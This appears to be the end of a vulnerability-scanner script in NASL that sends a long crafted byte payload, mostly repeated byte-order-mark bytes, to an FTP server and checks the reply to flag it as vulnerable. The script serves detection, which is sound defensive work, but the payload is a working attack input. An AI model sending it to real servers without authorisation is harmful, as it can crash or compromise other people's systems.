0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xfe, 0xff, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef,
0xbb, 0xbf, 0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xff, 0xef,
0xfe, 0xff, 0xff, 0xef, 0xff, 0xef, 0xfe, 0xff,
0xff, 0xef, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xff, 0xef, 0xfe, 0xff, 0xfe, 0xff,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff, 0xfe,
0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xfe, 0xff,
0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xfe, 0xff,
0xff, 0xef, 0xfe, 0xff, 0xff, 0xef, 0xfe, 0xff,
0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xff,
0xef, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xfe, 0xff, 0xff, 0xef, 0xff, 0xef, 0xfe, 0xff,
0xfe, 0xff, 0xfe, 0xff, 0xfe, 0xff, 0xef, 0xbb,
0xbf, 0xff, 0xef, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xff, 0xef, 0xfe,
0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xfe, 0xff, 0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xff, 0xef, 0xff, 0xef, 0xef, 0xbb, 0xbf,
0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff, 0xfe,
0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xfe,
0xff, 0xff, 0xef, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff,
0xff, 0xef, 0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xff, 0xef, 0xff, 0xef, 0xff,
0xef, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff,
0xef, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff,
0xfe, 0xff, 0xff, 0xef, 0xff, 0xef, 0xfe, 0xff,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xff, 0xef, 0xff,
0xef, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xfe, 0xff,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xff,
0xef, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xff, 0xef, 0xfe, 0xff,
0xfe, 0xff, 0xff, 0xef, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xff, 0xef, 0xff, 0xef, 0xfe, 0xff,
0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff,
0xef, 0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xfe, 0xff, 0xfe, 0xff, 0xff, 0xef, 0xfe, 0xff,
0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff,
0xef, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xff,
0xef, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xff, 0xef,
0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff,
0xfe, 0xff, 0xff, 0xef, 0xfe, 0xff, 0xef, 0xbb,
0xbf, 0xff, 0xef, 0xff, 0xef, 0xfe, 0xff, 0xff,
0xef, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff,
0xef, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xfe, 0xff,
0xfe, 0xff, 0xff, 0xef, 0xff, 0xef, 0xff, 0xef,
0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xff, 0xef, 0xfe, 0xff, 0xff, 0xef,
0xff, 0xef, 0xfe, 0xff, 0xff, 0xef, 0xfe, 0xff,
0xfe, 0xff, 0xfe, 0xff, 0xff, 0xef, 0xfe, 0xff,
0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xff, 0xef, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff,
0xef, 0xfe, 0xff, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xfe, 0xff, 0xfe, 0xff, 0xff, 0xef,
0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef,
0xbb, 0xbf, 0xfe, 0xff, 0xfe, 0xff, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xfe, 0xff, 0xfe, 0xff, 0xfe,
0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xff, 0xef, 0xfe, 0xff, 0xfe, 0xff, 0xfe,
0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xff, 0xef, 0xff, 0xef, 0xfe, 0xff,
0xff, 0xef, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xfe,
0xff, 0xfe, 0xff, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff,
0xef, 0xff, 0xef, 0xfe, 0xff, 0xff, 0xef, 0xfe,
0xff, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xff, 0xef, 0xfe, 0xff,
0xff, 0xef, 0xfe, 0xff, 0xfe, 0xff, 0xfe, 0xff,
0xfe, 0xff, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xfe,
0xff, 0xfe, 0xff, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xfe, 0xff, 0xff, 0xef, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xfe, 0xff, 0xff, 0xef, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xff,
0xef, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xff, 0xef, 0xfe,
0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff,
0xef, 0xff, 0xef, 0xff, 0xef, 0xfe, 0xff, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xfe, 0xff, 0xff, 0xef, 0xfe, 0xff, 0xfe, 0xff,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff, 0xfe,
0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xff, 0xef, 0xfe, 0xff, 0xfe, 0xff, 0xfe, 0xff,
0xff, 0xef, 0xff, 0xef, 0xff, 0xef, 0xfe, 0xff,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xfe, 0xff, 0xff, 0xef, 0xfe, 0xff, 0xff, 0xef,
0xfe, 0xff, 0xfe, 0xff, 0xfe, 0xff, 0xff, 0xef,
0xfe, 0xff, 0xff, 0xef, 0xfe, 0xff, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xff, 0xef, 0xff, 0xef, 0xfe, 0xff, 0xff, 0xef,
0xfe, 0xff, 0xfe, 0xff, 0xff, 0xef, 0xfe, 0xff,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xfe,
0xff, 0xfe, 0xff, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xff, 0xef, 0xfe,
0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff,
0xef, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff,
0xff, 0xef, 0xfe, 0xff, 0xff, 0xef, 0xfe, 0xff,
0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xfe, 0xff, 0xfe, 0xff, 0xfe,
0xff, 0xfe, 0xff, 0xff, 0xef, 0xff, 0xef, 0xff,
0xef, 0xfe, 0xff, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xfe, 0xff, 0xfe, 0xff, 0xef, 0xbb,
0xbf, 0xff, 0xef, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xff, 0xef, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff, 0xff,
0xef, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xff,
0xef, 0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xfe, 0xff, 0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xfe, 0xff, 0xfe,
0xff, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff,
0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff, 0xff, 0xef,
0xff, 0xef, 0xff, 0xef, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xff, 0xef, 0xff,
0xef, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef,
0xbb, 0xbf, 0xfe, 0xff, 0xfe, 0xff, 0xfe, 0xff,
0xff, 0xef, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef,
0xbb, 0xbf, 0xfe, 0xff, 0xfe, 0xff, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xff, 0xef, 0xff, 0xef, 0xfe,
0xff, 0xfe, 0xff, 0xfe, 0xff, 0xfe, 0xff, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xff, 0xef, 0xfe, 0xff,
0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff,
0xef, 0xff, 0xef, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xfe, 0xff, 0xfe, 0xff, 0xef, 0xbb,
0xbf, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xfe, 0xff, 0xfe, 0xff, 0xff, 0xef, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xff, 0xef, 0xfe, 0xff, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xfe, 0xff,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xff, 0xef, 0xfe,
0xff, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xff, 0xef, 0xfe, 0xff, 0xfe, 0xff, 0xff,
0xef, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xff,
0xef, 0xff, 0xef, 0xfe, 0xff, 0xff, 0xef, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff,
0xff, 0xef, 0xff, 0xef, 0xfe, 0xff, 0xfe, 0xff,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xfe, 0xff, 0xfe,
0xff, 0xfe, 0xff, 0xfe, 0xff, 0xfe, 0xff, 0xff,
0xef, 0xfe, 0xff, 0xff, 0xef, 0xff, 0xef, 0xff,
0xef, 0xff, 0xef, 0xfe, 0xff, 0xfe, 0xff, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xfe,
0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xfe,
0xff, 0xfe, 0xff, 0xff, 0xef, 0xfe, 0xff, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xff,
0xef, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xff,
0xef, 0xfe, 0xff, 0xfe, 0xff, 0xfe, 0xff, 0xef,
0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xfe,
0xff, 0xff, 0xef, 0xfe, 0xff, 0xfe, 0xff, 0xff,
0xef, 0xff, 0xef, 0xfe, 0xff, 0xff, 0xef, 0xff,
0xef, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xff, 0xef, 0xfe, 0xff, 0xff, 0xef, 0xfe,
0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff,
0xef, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xff, 0xef,
0xff, 0xef, 0xff, 0xef, 0xff, 0xef, 0xff, 0xef,
0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xff,
0xef, 0xff, 0xef, 0xff, 0xef, 0xfe, 0xff, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff, 0xfe, 0xff,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff, 0xef,
0xbb, 0xbf, 0xfe, 0xff, 0xff, 0xef, 0xfe, 0xff,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff,
0xff, 0xef, 0xff, 0xef, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xff, 0xef, 0xfe,
0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xff, 0xef, 0xff,
0xef, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xff,
0xef, 0xfe, 0xff, 0xfe, 0xff, 0xfe, 0xff, 0xfe,
0xff, 0xff, 0xef, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xfe, 0xff, 0xff, 0xef, 0xff, 0xef,
0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xff, 0xef, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff, 0xfe,
0xff, 0xfe, 0xff, 0xfe, 0xff, 0xfe, 0xff, 0xff,
0xef, 0xff, 0xef, 0xff, 0xef, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xff,
0xef, 0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xfe, 0xff, 0xff, 0xef, 0xfe, 0xff, 0xef, 0xbb,
0xbf, 0xff, 0xef, 0xff, 0xef, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xff,
0xef, 0xff, 0xef, 0xff, 0xef, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xfe,
0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xfe, 0xff,
0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xfe,
0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff,
0xef, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xff,
0xef, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xff,
0xef, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xfe, 0xff,
0xff, 0xef, 0xff, 0xef, 0xff, 0xef, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xff, 0xef, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0x0d, 0x0a );

## Open TCP Socket
soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

banner = recv_line(socket:soc, length:100);

## Sending Attack
snd = send(socket:soc, data:attack);

## Response
res = recv_line(socket:soc, length:6400);

## Checking Vulnerable Patterns
if(res =~ '^\x30\0x31\x20\x27\xef\x83\xb0*\xff')
{
  security_message(port:ftpPort);
  exit(0);
}
close(soc);
